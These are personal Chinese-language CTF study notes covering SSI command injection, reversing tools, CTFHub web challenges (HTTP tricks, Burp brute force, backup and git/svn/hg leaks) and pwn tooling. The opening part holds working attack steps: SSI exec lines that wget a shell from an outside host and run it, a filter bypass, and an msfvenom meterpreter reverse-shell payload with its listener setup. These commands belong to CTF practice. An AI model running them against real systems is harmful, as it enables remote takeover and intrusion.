				<!--#exec cmd="ls"-->
				切换到指定目录
				<!--#exec cmd="cd /root/dir/"-->
				下载shell脚本并重命名为shell.php
				<!--#exec cmd="wget http://ip/shell.txt|rename shell.txt shell.php" -->
				给shell.py提权
				<!--#exec cmd="chmod 777 shell.py"-->
				运行
				<!--#exec cmd="python shell.py"-->
					执行操作
						sysinfo 查看系统信息
						shell 进入系统shell
					优化终端 python -c 'import pty;pty.spawn("/bin/bash")'
					得到flag:
						cd /root/
						ls
						cat flag
						writeup 测试文档 总结文档
				使用大写exec-EXEC绕过检查
				制作webshell
					msfvenom -p python/meterpreter/reverse_tcp lhost=攻击机ip地址 lport=4444 -f raw > /root/Desktop/shell.py
					启动监听：
						msf>use exploit/multi/handler
						msf exploit(handler) > set payload python/meterpreter/reverse_tcp
						msf exploit(handler) > set lhost 攻击机ip地址
						msf exploit(handler)>set lport 4444
						msf exploit(handler)>run
					启动http服务：
						mV shell.py /var/www/html/
						ls -alh /var/www/html/
						service apache2 start
						service apachez status
10.reversing反编译：
	汇编基础：
		日常电脑是小端电脑：
			高字节保存在内存的高地址中
			低字节保存在内存的低地址中
	工具：

		反汇编工具-AndroidKiller_v1.3.1、APK改之理、APKIDE(我爱科技论坛下载)、Jadx等
		逆向分析工具-IDA pro 7.0（逆向多平台代码）空格：转汇编语言；f5：转伪C语言
		16进制编辑器-010 Editor
		root权限的安卓手机（动态调试）
		ghidra:把windows里的移到linux里使用
			安装java环境：apt install openjdk-11-jdk
			运行：./ghidraRun
		ida free
		OllyDbg

11：web
	11.1http协议
		1.自定义请求方式：
			curl -v -X CTFHUB http://challenge-beb8bdebb0d332be.sandbox.ctfhub.com:10800/index.php
			-X 后是方式
		2.cookie欺诈：
			在f12应用里的cookie值是可以更改的
		3.基础认证：
			burp:
				authorization可以得到输入的Base64编码
				1.右键，send to intruder->adds$
				2.导入密码本
				3.添加前缀规则
				4.取消url编码的勾选，不然=会被转换成%3d
				查看response得到结果
		4.HTTP响应包源代码查看
	11.2信息泄露使用dirsearch查看
		1.phpinfo:如命令http://127.0.0.1/index.php?cmd=phpinfo()
		2.网站备份：
			2.1常见的网站源码备份文件后缀
				python dirsearch.py -u http://challenge-01a57e59abc2b104.sandbox.ctfhub.com:10800/ -e *
				tar
				tar.gz
				zip
				rar
				常见的网站源码备份文件名
				web
				website
				backup
				back
				www
				wwwroot
				temp
				在网站访问对应备份文件得到flag
			2.2 网页后加上.bak后缀得到备份文件
				http://challenge-777919f88e2f561c.sandbox.ctfhub.com:10800/index.php.bak
			2.3 vim
				以 index.php 为例：第一次产生的交换文件名为 .index.php.swp
				再次意外退出后，将会产生名为 .index.php.swo 的交换文件
				第三次产生的交换文件则为 .index.php.swn
			2.4 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件
				通过.DS_Store可以知道这个目录里面所有文件的清单。
					.file文件使用linux的cat命令读取
		3.git泄露
			3.1 log(目录有.git)
				githack:使用方式
					GitHacker --url <目标URL> --output-folder <本地保存路径>
					>GitHacker --url 网站/.git/ --output-folder D:\studyFiles\net_defend\tool\web安全\message_divulge\git\get_message
					对应目录产生challenge-4c4dc7f7452b5c35.sandbox.ctfhub.com_10800
					进入对应challenge~目录命令行输入：
						git log 命令历史由早到晚
						git show +对应记录的哈希值（git show显示的第一条）得到对应修改信息
						git stash list 查看储藏列表
						git stash pop  恢复最新储藏并弹出
						git stash apply stash@{1} 恢复对应储藏
						git diff  d9443bc1dec7614952d696e849725113edcdf450对比当前与选中
		4.SVN 泄露漏洞。
			工具：
				svnExploit-master：目录（D:\studyFiles\net_defend\tool\web安全\message_divulge\SvnExploit\svnExploit-master）
					帮助：
						python SvnExploit.py -h
					检测泄露：
						python SvnExploit.py -u http://192.168.27.128/.svn
					下载源码：
						python SvnExploit.py -u http://192.168.27.128/.svn --dump
						换解释器
						D:\app\anaconda\python.exe SvnExploit.py -u http://challenge-3f4152c6942bdf94.sandbox.ctfhub.com:10800/.svn --dump
    
				dvcs-ripper:（kali下用于查看先前版本）
					进入目录
					#cd ./dvcs-ripper-master 
					#./rip-svn.pl -u http://xxx/.svn
					或
					#./rip-svn.pl -v -u http://xxx.com/.svn
						在：set_get目录下执行：
							#../dvcs-ripper-master/rip-svn.pl -v -u http://challenge-3f4152c6942bdf94.sandbox.ctfhub.com:10800/.svn 

						补充：
							 添加执行权限：chmod +x rip-svn.pl
		5.hg泄露：
			#../dvcs-ripper-master/rip-hg.pl -u http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/.hg
			#tree .hg
			#cat .hg/last-message.txt
			#grep -a -r flag
			#curl http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/flag_1682217975.txt



12.pwn
	工具:
		Pwntool:
			使用：
				$python3
				>>>from pwn import *
		Gbd:
			使用：
				$gdb
		qemu模拟器：
			python：使用虚拟环境安装
					激活：
				    	$source .venv/bin/activate
					退出：
						$deactivate
13.misc
	13.1dump系统崩溃数据（.DMP文件）
		工具：windbg(开始菜单搜索)
			输入!analyze -v 查看数据
       
    
    
				



	

		
		



